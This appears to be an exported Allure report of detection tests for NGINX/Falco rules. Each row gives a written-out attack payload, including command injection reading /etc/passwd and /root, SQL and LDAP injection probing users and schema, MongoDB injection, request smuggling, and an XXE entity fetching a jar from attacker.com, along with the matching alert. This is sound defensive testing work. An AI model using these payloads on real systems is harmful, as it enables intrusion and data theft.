"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_005` |
| **Name** | Root directory listing via substitution |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(ls -la /root)`
- **Encoded**: `%24%28ls%20-la%20%2Froot%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 13:44:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1771076653365-hj3q58 pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1771076653365-hj3q58 pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1

**Falco Log Entry**:
```
13:44:13.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_005-1771076653365-hj3q58 pattern_id=CMD_SUB_005 uri=/?q=%24%28ls%20-la%20%2Froot%29 client=127.0.0.1
```","2","test_e2e_with_logs[371_CMD_SUB_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_014` |
| **Name** | SUBSTRING function test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR SUBSTRING('test',1,1)='t' --`
- **Encoded**: `'%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 13:44:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1771076656407-7e6ddr pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1771076656407-7e6ddr pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:16.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_014-1771076656407-7e6ddr pattern_id=SQLI_BOOL_014 uri=/?q='%20OR%20SUBSTRING('test'%2C1%2C1)%3D't'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[045_SQLI_BOOL_014]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_010` |
| **Name** | Disk space information |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `&& df -h`
- **Encoded**: `%26%26%20df%20-h`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~73000ms
- **Timestamp**: 13:44:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_010-1771076640838-dvigyi pattern_id=CMD_BASIC_010 uri=/?q=%26%26%20df%20-h client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_010-1771076640838-dvigyi pattern_id=CMD_BASIC_010 uri=/?q=%26%26%20df%20-h client=127.0.0.1

**Falco Log Entry**:
```
13:44:00.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_010-1771076640838-dvigyi pattern_id=CMD_BASIC_010 uri=/?q=%26%26%20df%20-h client=127.0.0.1
```","2","test_e2e_with_logs[314_CMD_BASIC_010]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_005` |
| **Name** | XXE data URI scheme injection |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""data:text/plain;base64,dGVzdA=="">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 13:44:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1771076653332-lusvwe pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1771076653332-lusvwe pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:13.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1771076653332-lusvwe pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[495_XXE_ENTITY_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_GROUPBY_001` |
| **Name** | GROUP BY Subquery Injection |
| **Category** | SQLI |
| **Subcategory** | group_by_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' GROUP BY (SELECT table_name FROM information_schema.tables LIMIT 1)--`
- **Encoded**: `'%20GROUP%20BY%20(SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201)--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 13:44:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_GROUPBY_001-1771076682970-752gbo pattern_id=SQLI_GROUPBY_001 uri=/?q='%20GROUP%20BY%20(SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201)-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_GROUPBY_001-1771076682970-752gbo pattern_id=SQLI_GROUPBY_001 uri=/?q='%20GROUP%20BY%20(SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201)-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:42.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_GROUPBY_001-1771076682970-752gbo pattern_id=SQLI_GROUPBY_001 uri=/?q='%20GROUP%20BY%20(SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201)-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[077_SQLI_GROUPBY_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_002` |
| **Name** | LDAP user enumeration injection |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `*)(|(uid=admin)(uid=administrator))`
- **Encoded**: `*)(|(uid%3Dadmin)(uid%3Dadministrator))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 13:44:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_002-1771076649335-sqnd pattern_id=LDAP_BLIND_002 uri=/?q=*)(|(uid%3Dadmin)(uid%3Dadministrator)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_002-1771076649335-sqnd pattern_id=LDAP_BLIND_002 uri=/?q=*)(|(uid%3Dadmin)(uid%3Dadministrator)) client=127.0.0.1

**Falco Log Entry**:
```
13:44:09.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_002-1771076649335-sqnd pattern_id=LDAP_BLIND_002 uri=/?q=*)(|(uid%3Dadmin)(uid%3Dadministrator)) client=127.0.0.1
```","2","test_e2e_with_logs[400_LDAP_BLIND_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_JAR_001` |
| **Name** | XXE JAR protocol remote code execution |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""jar:http://attacker.com/evil.jar!/"">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 13:44:14.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1771076654335-czml0j pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1771076654335-czml0j pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:44:14.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1771076654335-czml0j pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[540_XXE_JAR_001]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_005` |
| **Name** | MongoDB JavaScript code injection |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; return db.users.find(); //`
- **Encoded**: `%27%3B%20return%20db.users.find%28%29%3B%20//`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~70000ms
- **Timestamp**: 13:44:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1771076643331-j6302c pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1771076643331-j6302c pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1

**Falco Log Entry**:
```
13:44:03.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1771076643331-j6302c pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1
```","2","test_e2e_with_logs[567_EMRG_MONGO_005]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_003` |
| **Name** | cPickle.loads Remote Code Execution |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `cPickle.loads(data)`
- **Encoded**: `cPickle.loads%28data%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 13:44:42.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Deserialization attack` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1771076682329-mcwz5q pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1771076682329-mcwz5q pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1

**Falco Log Entry**:
```
13:44:42.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_003-1771076682329-mcwz5q pattern_id=PICKLE_DESER_003 uri=/?q=cPickle.loads%28data%29 client=127.0.0.1
```","1","test_e2e_with_logs[451_PICKLE_DESER_003]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_014` |
| **Name** | Multiple semicolons injection |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;;ls`
- **Encoded**: `%3B%3Bls`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 13:44:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1771076642842-4qj5vh pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1771076642842-4qj5vh pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1

**Falco Log Entry**:
```
13:44:02.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_014-1771076642842-4qj5vh pattern_id=CMD_BASIC_014 uri=/?q=%3B%3Bls client=127.0.0.1
```","2","test_e2e_with_logs[318_CMD_BASIC_014]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_018` |
| **Name** | URL encoded AND injection |
| **Category** | SQLI |
| **Subcategory** | boolean_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%27%20AND%20%271%27%3D%271`
- **Encoded**: `%2527%2520AND%2520%25271%2527%253D%25271`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 13:44:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_018-1771076674449-8y89ka pattern_id=SQLI_BOOL_018 uri=/?q=%2527%2520AND%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_018-1771076674449-8y89ka pattern_id=SQLI_BOOL_018 uri=/?q=%2527%2520AND%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:34.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=SQLI_BOOL_018-1771076674449-8y89ka pattern_id=SQLI_BOOL_018 uri=/?q=%2527%2520AND%2520%25271%2527%253D%25271 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[049_SQLI_BOOL_018]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_UNION_002` |
| **Name** | UNION ALL SELECT with multiple NULLs |
| **Category** | SQLI |
| **Subcategory** | union_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `UNION ALL SELECT NULL,NULL`
- **Encoded**: `UNION%20ALL%20SELECT%20NULL%2CNULL`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~79000ms
- **Timestamp**: 13:43:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1771076634358-en79ox pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1771076634358-en79ox pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:43:54.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_UNION_002-1771076634358-en79ox pattern_id=SQLI_UNION_002 uri=/?q=UNION%20ALL%20SELECT%20NULL%2CNULL client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[117_SQLI_UNION_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_063` |
| **Name** | Pipe Cat Passwd |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| cat /etc/passwd`
- **Encoded**: `%7C%20cat%20%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 13:44:27.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1771076667397-ckcdep pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1771076667397-ckcdep pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:44:27.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_ADV_063-1771076667397-ckcdep pattern_id=CMD_ADV_063 uri=/?q=%7C%20cat%20%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[291_CMD_ADV_063]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_CHUNK_002` |
| **Name** | Obfuscated Chunked |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | chunked |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Transfer-Encoding: xchunked`
- **Encoded**: `Transfer-Encoding%3A%20xchunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 13:44:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1771076693834-g8dtp pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1771076693834-g8dtp pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1

**Falco Log Entry**:
```
13:44:53.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1771076693834-g8dtp pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1
```","2","test_e2e_with_logs[422_HRS_CHUNK_002]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_007` |
| **Name** | Username existence check |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT LOCATE('admin',(SELECT GROUP_CONCAT(username) FROM users)))>0 --`
- **Encoded**: `'%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 13:44:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1771076657910-m6fzz pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1771076657910-m6fzz pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:17.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1771076657910-m6fzz pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[028_SQLI_BLIND_007]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_009` |
| **Name** | Column count discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>3 --`
- **Encoded**: `'%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users')%3E3%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 13:44:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_009-1771076658912-unrh0r pattern_id=SQLI_BLIND_009 uri=/?q='%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users')%3E3%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_009-1771076658912-unrh0r pattern_id=SQLI_BLIND_009 uri=/?q='%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users')%3E3%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:44:18.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_009-1771076658912-unrh0r pattern_id=SQLI_BLIND_009 uri=/?q='%20AND%20(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users')%3E3%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[030_SQLI_BLIND_009]","allure","2026-02-14","passed","2026-02-14","","test_e2e_wrapper","",""
